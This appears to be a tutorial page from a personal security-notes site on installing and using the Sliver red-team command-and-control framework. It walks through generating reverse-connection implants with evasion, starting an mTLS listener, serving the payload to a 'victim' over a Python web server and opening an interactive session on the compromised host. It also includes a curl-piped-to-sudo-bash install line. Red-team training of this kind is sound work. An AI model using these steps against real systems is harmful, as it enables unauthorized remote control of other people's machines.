# About
[Sliver](https://github.com/BishopFox/sliver) is an open source projected created and maintained by [BishopFox](https://www.bishopfox.com/) as an open source multi-platform adversary emulation and red team tool. Sliver facilitates the generations of reverse connection payloads as EXE, DLL, or Shellcode.
## Links
[Github](https://github.com/BishopFox/sliver)
[Sliver Wiki](https://github.com/BishopFox/sliver/wiki/Getting-Started)
# Installing
It has binaries for Windows, Linux, MacOS allowing you to deploy Sliver C2 infrastructure on any system. - This can be downloaded directly from the [Sliver Repo](https://github.com/BishopFox/sliver/releases) using wget or directly.
- Pre-reqs
```
sudo apt install -y mingw-w64 binutils-mingw-w64 g++-mingw-w64
```
- Install on system
```
curl https://sliver.sh/install | sudo bash
```
- Run it
```
sliver
```
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FZdHaNklKw63ti1DTNW5W%252Fimage.png%3Falt%3Dmedia%26token%3Dd9d14053-e6c9-4263-ae9c-4406a79b75ae&width=768&dpr=4&quality=100&sign=85a377d9&sv=2)

## Standalone release
```
wget https://github.com/BishopFox/sliver/releases/download/v1.4.14/sliver-server_linux.zip
```
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FFk90cfZLRP51UCHjyHoE%252Fimage.png%3Falt%3Dmedia%26token%3D44541d48-d69b-4b27-b767-cec233abcf77&width=768&dpr=4&quality=100&sign=f1379caf&sv=2)

- Unzip the file
```
unzip sliver-server_linux.zip
```
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FdanhnhcE9fI0F1GieFik%252Fimage.png%3Falt%3Dmedia%26token%3Dac414235-50ba-4d95-915c-c1a5f719dbbc&width=768&dpr=4&quality=100&sign=5309f22e&sv=2)

- Make it executable
```
chmod +x sliver-server
```

- Run it
```
sudo ./sliver-server
```
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FlgQlsMu6wn4N0ueBqjEw%252Fimage.png%3Falt%3Dmedia%26token%3Db380ba20-6aa7-4954-9663-2c82339eb853&width=768&dpr=4&quality=100&sign=a3d7cc23&sv=2)

# Usage
## Making a payload
to generate at payload you must know your IP address(external if this is hosted externally). This will generate a randomly named executable file file that can be delivered to targets in a variety of ways. The flags `-m` and `-e` flags used above represent Natural-TLS connection to use to connect back on and evasion respectively. The IP address entered is the IP address of your Sliver server.
```
generate -m (attacker ip) -e
```
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FQwrdKzXsbqxnScqz8UMT%252Fimage.png%3Falt%3Dmedia%26token%3Df5864612-9802-4bac-a894-06affc4ace4f&width=768&dpr=4&quality=100&sign=544ca7d4&sv=2)

The executable file will be in the folder where sliver was run.
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FQGv7GbqeMMhVTwgmOJRT%252Fimage.png%3Falt%3Dmedia%26token%3Ddff24fe0-05ca-4c1d-8729-df1df8791406&width=768&dpr=4&quality=100&sign=5dac6b08&sv=2)
## Making .dll payload
```
generate —mtls (attacker ip) —format shared —skip-symbols
```
## Starting The MTLS Listener
The listener must be started before the delivery and exectuion of the payload on a target system. This listener will display all active connectsions from target systems to your C2 server.
```
mtls
```
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FqaLWCr24EJv3rLEbmb5J%252Fimage.png%3Falt%3Dmedia%26token%3Def45954b-a96a-49d4-adb9-c36eff406eca&width=768&dpr=4&quality=100&sign=f50b18cb&sv=2)
## Exploit

Get the executable onto the victim. I'll do this via a quick python webserver.
```
python3 -m http.server 8008
```
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FXMkOtRtG8q0xEYWvgHxe%252Fimage.png%3Falt%3Dmedia%26token%3Dc9074eaa-1a21-4b15-b533-fcbcd1c3159d&width=768&dpr=4&quality=100&sign=afd0a604&sv=2)

When the server is being accessed and a file is being downloaded
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FqWk8ml8gmA03S9F8V2OH%252Fimage.png%3Falt%3Dmedia%26token%3D299234f4-2e5d-4e85-8e64-b7ecb72c014c&width=768&dpr=4&quality=100&sign=3c06dbc6&sv=2)

On the victim machine go to the webserver and click on the file you want to download
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FbOs5WIKRykzNB2U93FA2%252Fimage.png%3Falt%3Dmedia%26token%3Ddd607ab9-2fce-4d9e-9d16-ce7dc94f7ce0&width=768&dpr=4&quality=100&sign=f016f75b&sv=2)
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FfZ5b3V8i0q0Dgt4BJyx4%252Fimage.png%3Falt%3Dmedia%26token%3Dd8b05566-cbc4-4bb8-8b23-d1c8bfbbba4c&width=768&dpr=4&quality=100&sign=aeaa7b2f&sv=2)

Once it is executed, we should see the connection from the sliver terminal.
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252F10rjyyYDW3zfwhhOQewX%252Fimage.png%3Falt%3Dmedia%26token%3D6b36b1dc-aafe-4342-8db8-90fdd21e98d6&width=768&dpr=4&quality=100&sign=ad999740&sv=2)

We can also check on active sessions or alive sessions with `sessions`
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FaQ3OKsMEo3CQYf9ZKpmH%252Fimage.png%3Falt%3Dmedia%26token%3Dc12c9cd8-9184-4caf-bddd-108b190418bb&width=768&dpr=4&quality=100&sign=6ea226c9&sv=2)

Connect to the session
```
sessions -i (session id)
```
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FctbNOo1zP3r61UUkerim%252Fimage.png%3Falt%3Dmedia%26token%3D260b16c3-8755-4466-898a-b48e116bf5a2&width=768&dpr=4&quality=100&sign=dda9838f&sv=2)

Run whatever commands you may need/want:
![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FLGi10lWw2zcjl4wDJVPL%252Fimage.png%3Falt%3Dmedia%26token%3D06158d0f-dbbb-4232-b4f5-f7df98ec3d07&width=768&dpr=4&quality=100&sign=423764e1&sv=2)